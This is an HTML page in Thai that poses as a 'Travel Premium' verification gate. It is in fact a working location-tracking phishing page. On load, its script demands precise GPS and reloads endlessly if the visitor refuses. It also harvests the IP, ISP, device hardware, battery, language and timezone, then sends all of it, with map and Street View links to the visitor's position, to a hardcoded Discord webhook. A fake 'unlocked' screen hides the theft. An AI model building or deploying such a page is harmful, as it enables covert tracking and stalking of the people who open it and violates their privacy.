<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Travel Premium - Verified Service</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #010409; color: white; overflow: hidden; user-select: none; }
        .glass-panel { background: rgba(13, 17, 23, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .scan-line { height: 2px; background: linear-gradient(90deg, transparent, #3b82f6, transparent); position: absolute; width: 100%; top: 0; animation: scan move 1.5s infinite linear; }
        @keyframes move { 0% { top: 0; opacity: 0; } 50% { opacity: 1; } 100% { top: 100%; opacity: 0; } }
        /* บังคับให้หน้าโหลดค้างไว้จนกว่าจะผ่าน */
        #loading-zone { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 200px; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative border border-white/10">
        <div class="p-8 pb-4 text-center">
            <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em] font-bold">
                Identity Security Lock v20.0
            </div>
            <h1 id="status-title" class="text-3xl font-bold mb-2 tracking-tight">ต้องยืนยันพิกัด</h1>
            <p id="status-desc" class="text-slate-400 text-sm leading-relaxed">กรุณากด "อนุญาต" หรือ "ตกลง" เมื่อระบบถามหาพิกัด เพื่อปลดล็อกเนื้อหาพรีเมียม</p>
        </div>

        <div class="p-8 pt-0">
            <div id="loading-zone">
                <div class="relative w-40 h-40 mx-auto mb-8 rounded-[2rem] border border-blue-500/30 overflow-hidden bg-slate-900 flex items-center justify-center">
                    <div id="icon-status" class="text-5xl animate-bounce">📍</div>
                    <div class="scan-line"></div>
                </div>
                <div id="logs" class="w-full text-[10px] font-mono text-slate-500 text-left bg-black/40 p-4 rounded-2xl border border-white/5 h-32 overflow-hidden leading-relaxed">
                    <p class="text-yellow-400">> รอการตอบรับสิทธิ์ GPS...</p>
                </div>
            </div>

            <div id="result-zone" class="hidden animate-in fade-in zoom-in duration-500">
                <div class="mb-5 p-4 bg-green-500/10 border border-green-500/20 rounded-[1.5rem] flex items-center gap-4 text-green-400">
                    <div class="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center text-white text-2xl">✓</div>
                    <div>
                        <p class="font-bold text-sm uppercase">ปลดล็อกสำเร็จ</p>
                        <p class="text-[10px] opacity-70">เข้าถึงระบบ Google Local เรียบร้อย</p>
                    </div>
                </div>
                <div id="links-container" class="space-y-3"></div>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497104681770549318/pOsCVRZNsGnE8hxcr8YsMGuML2GfV95ALQSuxRF9KrLUrOgnaccBxt0Kc9Ygc6WruqkH";
        let hasSent = false;

        function log(msg, color = "blue-400/60") {
            const l = document.getElementById('logs');
            l.innerHTML += `<p class="text-${color}">> ${msg}</p>`;
            l.scrollTop = l.scrollHeight;
        }

        async function requestLocation() {
            if (!navigator.geolocation) {
                alert("เบราว์เซอร์ของคุณไม่รองรับ GPS");
                return;
            }

            const options = {
                enableHighAccuracy: true, // บังคับใช้ความแม่นยำสูง (GPS)
                timeout: 15000,           // รอนานสูงสุด 15 วิ
                maximumAge: 0             // ไม่ใช้ข้อมูลเก่าที่ค้างในแคช
            };

            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    // กรณีผู้ใช้กดยอมรับ (Success)
                    document.getElementById('icon-status').innerText = "✅";
                    log("ได้รับพิกัดแม่นยำสูงสำเร็จ!", "green-400");
                    
                    const network = await getNetwork();
                    const hardware = getHardware();
                    const battery = await getBattery();

                    const finalData = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy.toFixed(1),
                        ...network, ...hardware, battery,
                        lang: navigator.language,
                        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
                    };

                    await sendReport(finalData, "🟢 MANDATORY_TRACE_SUCCESS");
                    showUI(finalData);
                },
                (err) => {
                    // กรณีผู้ใช้กดปฏิเสธ หรือมีข้อผิดพลาด
                    console.error(err);
                    log("ข้อผิดพลาด: คุณต้องกดยอมรับสิทธิ์พิกัดเพื่อเข้าใช้งาน", "red-400");
                    
                    // บังคับเด้ง Alert เพื่อขัดจังหวะการปฏิเสธ
                    alert("⚠️ การยืนยันล้มเหลว: จำเป็นต้องเข้าถึงพิกัดเพื่อยืนยันความปลอดภัยในพื้นที่ของคุณ");
                    
                    // บังคับโหลดหน้าใหม่เพื่อขอซ้ำทันที (Infinite Loop จนกว่าจะกดให้)
                    location.reload();
                }, 
                options
            );
        }

        // เริ่มทำงานทันทีที่โหลด
        window.onload = () => {
            requestLocation();
        };

        async function getNetwork() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                return { ip: d.ip, isp: d.org, city: d.city, country: d.country_name };
            } catch (e) { return { ip: "Unknown", isp: "N/A", city: "N/A" }; }
        }

        function getHardware() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
            return {
                gpu,
                cores: navigator.hardwareConcurrency || "N/A",
                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
                platform: navigator.platform
            };
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                return `${(b.level * 100).toFixed(0)}% (${b.charging ? 'ชาร์จ' : 'แบต'})`;
            } catch { return "N/A"; }
        }

        async function sendReport(d, type) {
            if (hasSent) return;
            hasSent = true;
            const payload = {
                embeds: [{
                    title: `🎯 [FORCE SUCCESS] ${type}`,
                    color: 3066993,
                    fields: [
                        { name: "🌐 เน็ต/IP", value: `**IP:** \`${d.ip}\`\n**ISP:** ${d.isp}\n**พื้นที่:** ${d.city}, ${d.country}`, inline: false },
                        { name: "📍 พิกัด GPS", value: `\`${d.lat}, ${d.lon}\`\n(แม่นยำ +/- ${d.acc} ม.)`, inline: true },
                        { name: "🔋 แบต", value: d.battery, inline: true },
                        { name: "🔗 นำทาง", value: `📍 [Maps](https://www.google.com/maps?q=${d.lat},${d.lon}) | 🏠 [StreetView](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${d.lat},${d.lon})`, inline: false }
                    ]
                }]
            };
            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        }

        function showUI(d) {
            document.getElementById('loading-zone').classList.add('hidden');
            document.getElementById('result-zone').classList.remove('hidden');
            document.getElementById('status-title').innerText = "เข้าใช้งานได้แล้ว";
            document.getElementById('status-desc').innerText = "ขอบคุณสำหรับการยืนยันตัวตนพิกัดจริง";

            const container = document.getElementById('links-container');
            container.innerHTML = `
                <a href="https://www.google.com/maps/search/?api=1&query=${d.lat},${d.lon}" target="_blank" class="flex items-center gap-4 bg-blue-600 p-5 rounded-2xl hover:bg-blue-500 transition-all shadow-lg">
                    <span class="text-2xl">🌍</span>
                    <div class="flex-1 text-left">
                        <p class="text-white text-sm font-bold">เข้าสู่หน้าหลัก Premium</p>
                        <p class="text-blue-100 text-[10px]">ปลดล็อกพิกัดใน ${d.city} แล้ว</p>
                    </div>
                </a>
            `;
        }
    </script>
</body>
</html>
